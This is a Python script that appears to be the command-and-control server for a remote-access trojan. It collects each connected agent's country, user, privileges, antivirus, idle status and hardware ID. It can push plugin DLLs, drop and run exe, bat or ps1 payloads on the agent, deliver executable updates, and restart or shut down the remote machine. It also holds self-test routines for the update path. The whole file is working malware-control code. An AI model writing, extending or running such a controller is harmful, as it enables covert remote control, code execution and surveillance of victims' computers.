import argparse
import base64
import os
import socket
import hashlib
import queue
import threading
import time

MAX_UPDATE_BYTES = 64 * 1024 * 1024

FIELDS = [
    "Country", "Nickname", "Tag", "User", "Version", "Privileges",
    "OS", "GPU", "CPU", "RAM", "AntiVirus", "Uptime", "AFK",
    "Ping", "HWID", "Fingerprint",
]

HELP_TEXT = """Commands:
  close / exit / quit        Disconnect the agent
  reconnect                  Reconnect the agent
  sleep / hibernate          Power commands
  restart / shutdown         Power commands
  load:<path>                Load a plugin DLL
  unload:<id>                Unload a loaded plugin
  event:<name>               Fire a plugin event
  execute:<ext>:<path>       Drop and run a file on the agent
                             ext: exe | bat | ps1
  update:<path>              Send an executable update as raw file bytes
  <path>                     Shorthand for load:<path>"""

def read_line(s):
    b = bytearray()
    while True:
        try:
            c = s.recv(1)
        except ConnectionResetError:
            return ""
        if not c or c == b"\n":
            return bytes(b).decode(errors="replace").rstrip("\r")
        b.extend(c)

def show(line):
    if not line.startswith("DATA:"):
        print(line)
        return
    vals = line[5:].split("|")
    for i, name in enumerate(FIELDS):
        print(f"{name}: {vals[i] if i < len(vals) else 'Unknown'}")

def wait_result(s):
    while True:
        line = read_line(s)
        if not line:
            return line
        if line.startswith("DATA:"):
            show(line)
            continue
        if line == "HB":
            s.sendall(b"PONG\n")
            continue
        print(line)
        if line.startswith("ACK:") or line.startswith("ERR:"):
            return line

def plugin_cmd(path):
    with open(path, "rb") as f:
        data = f.read()
    stem = os.path.splitext(os.path.basename(path))[0]
    b64 = base64.b64encode(data).decode()
    return f"CMD:PLUGIN:{stem}:{b64}"

def update_cmd(path):
    size = os.path.getsize(path)
    if size == 0:
        raise ValueError("update file is empty")
    if size > MAX_UPDATE_BYTES:
        raise ValueError(f"update file is larger than {MAX_UPDATE_BYTES} bytes")
    with open(path, "rb") as f:
        data = f.read()
    if len(data) != size:
        raise OSError("update file changed while it was being read")
    digest = hashlib.sha256(data).hexdigest()
    b64 = base64.b64encode(data).decode()
    return f"CMD:UPDATE:{digest}:{b64}"

def execute_cmd(ext, path):
    with open(path, "rb") as f:
        data = f.read()
    b64 = base64.b64encode(data).decode()
    return f"CMD:EXECUTE:{ext.lower()}:{b64}"

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--ip", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=4793)
    ap.add_argument("--test")
    ap.add_argument("--update-test")
    ap.add_argument("--expect-version")
    a = ap.parse_args()

    with socket.create_server((a.ip, a.port)) as server:
        print(f"listening {a.ip}:{a.port}")
        conn, addr = server.accept()
        with conn:
            print(f"connected {addr[0]}")
            hello = read_line(conn)
            data = read_line(conn)
            print(hello)
            show(data)
            if a.update_test:
                update_path = a.update_test
                with open(update_path, "rb") as f:
                    update_bytes = f.read()
                digest = hashlib.sha256(update_bytes).hexdigest()

                pending = queue.Queue()
                stop_accept = threading.Event()

                def handle_extra(client):
                    try:
                        hello = read_line(client)
                        data = read_line(client)
                        if hello.startswith("HELLO:UPDATE-PROBE:"):
                            fields = hello[len("HELLO:UPDATE-PROBE:"):].split(":")
                            if len(fields) != 3 or len(data) == 0 or not data.startswith("DATA:"):
                                client.close()
                                return
                            fingerprint, token, candidate_hash = fields
                            if candidate_hash.lower() != digest.lower():
                                client.sendall(b"ERR:UPDATE-PROBE\n")
                                client.close()
                                return
                            client.sendall((f"ACK:UPDATE-PROBE:{fingerprint}:{token}\n").encode())
                            client.close()
                            return
                        pending.put((client, hello, data))
                    except (ConnectionError, OSError):
                        try:
                            client.close()
                        except OSError:
                            pass

                def accept_extra():
                    while not stop_accept.is_set():
                        try:
                            server.settimeout(0.2)
                            client, _ = server.accept()
                        except socket.timeout:
                            continue
                        except OSError:
                            break
                        threading.Thread(target=handle_extra, args=(client,), daemon=True).start()

                accept_thread = threading.Thread(target=accept_extra, daemon=True)
                accept_thread.start()
                try:
                    print("update phase: sending tampered payload")
                    tampered = bytearray(update_bytes)
                    tampered[0] ^= 0xFF
                    bad = base64.b64encode(tampered).decode()
                    conn.sendall((f"CMD:UPDATE:{digest}:{bad}\n").encode())
                    bad_result = wait_result(conn)
                    if not bad_result.startswith("ERR:UPDATE:"):
                        raise SystemExit("tampered update was not rejected")

                    print("update phase: sending valid payload")
                    conn.sendall((update_cmd(update_path) + "\n").encode())
                    good_result = wait_result(conn)
                    if not good_result.startswith("ACK:UPDATE:"):
                        raise SystemExit("valid update was not acknowledged")
                    print("update phase: valid payload acknowledged")
                    conn.close()

                    deadline = time.monotonic() + 45
                    final = None
                    while time.monotonic() < deadline:
                        try:
                            client, hello, data = pending.get(timeout=0.25)
                        except queue.Empty:
                            continue
                        if hello.startswith("HELLO:FINGERPRINT:"):
                            final = (client, hello, data)
                            break
                        try:
                            client.close()
                        except OSError:
                            pass
                    if final is None:
                        raise SystemExit("updated agent did not reconnect to the server")
                    new_conn, new_hello, new_data = final
                    with new_conn:
                        print(new_hello)
                        show(new_data)
                        if a.expect_version:
                            vals = new_data[5:].split("|") if new_data.startswith("DATA:") else []
                            version = vals[FIELDS.index("Version")] if len(vals) > FIELDS.index("Version") else ""
                            if version != a.expect_version:
                                raise SystemExit(f"updated version mismatch: {version!r}")
                        new_conn.sendall(b"CMD:CLOSE\n")
                        result = wait_result(new_conn)
                        if not result.startswith("ACK:CLOSE"):
                            raise SystemExit("updated agent did not close cleanly")
                    return
                finally:
                    stop_accept.set()
                    try:
                        server.close()
                    except OSError:
                        pass

            if a.test:
                stem = os.path.splitext(os.path.basename(a.test))[0]
                cmds = [
                    plugin_cmd(a.test),
                    f"CMD:PLUGIN_EVENT:ping",
                    f"CMD:UNLOAD:{stem}",
                    "CMD:CLOSE",
                ]
                for cmd in cmds:
                    conn.sendall((cmd + "\n").encode())
                    result = wait_result(conn)
                    if result.startswith("ERR:") or not result:
                        raise SystemExit(1)
                return
            while True:
                try:
                    cmd = input("> ").strip()
                except (EOFError, KeyboardInterrupt):
                    return
                if not cmd:
                    continue
                lc = cmd.lower()
                if lc == "--help":
                    print(HELP_TEXT)
                    continue
                if lc in {"close", "exit", "quit"}:
                    conn.sendall(b"CMD:CLOSE\n")
                elif lc in {"reconnect", "sleep", "hibernate", "restart", "shutdown"}:
                    conn.sendall((f"CMD:{lc.upper()}\n").encode())
                elif lc.startswith("unload:"):
                    conn.sendall((f"CMD:UNLOAD:{cmd.split(':', 1)[1].strip()}\n").encode())
                elif lc.startswith("event:"):
                    conn.sendall((f"CMD:PLUGIN_EVENT:{cmd.split(':', 1)[1].strip()}\n").encode())
                elif lc.startswith("load:"):
                    path = cmd.split(":", 1)[1].strip()
                    try:
                        conn.sendall((plugin_cmd(path) + "\n").encode())
                    except OSError as e:
                        print(f"error: {e}")
                        continue
                elif lc.startswith("update:"):
                    path = cmd.split(":", 1)[1].strip()
                    try:
                        conn.sendall((update_cmd(path) + "\n").encode())
                    except OSError as e:
                        print(f"error: {e}")
                        continue
                elif lc.startswith("execute:"):
                    rest = cmd.split(":", 2)
                    if len(rest) < 3:
                        print("usage: execute:<ext>:<path>")
                        continue
                    ext, path = rest[1].strip(), rest[2].strip()
                    if ext.lower() not in {"exe", "bat", "ps1"}:
                        print("error: ext must be exe, bat, or ps1")
                        continue
                    try:
                        conn.sendall((execute_cmd(ext, path) + "\n").encode())
                    except OSError as e:
                        print(f"error: {e}")
                        continue
                else:
                    try:
                        conn.sendall((plugin_cmd(cmd) + "\n").encode())
                    except OSError as e:
                        print(f"error: {e}")
                        continue
                if not wait_result(conn):
                    return
                if lc in {"close", "exit", "quit"}:
                    return

if __name__ == "__main__":
    main()
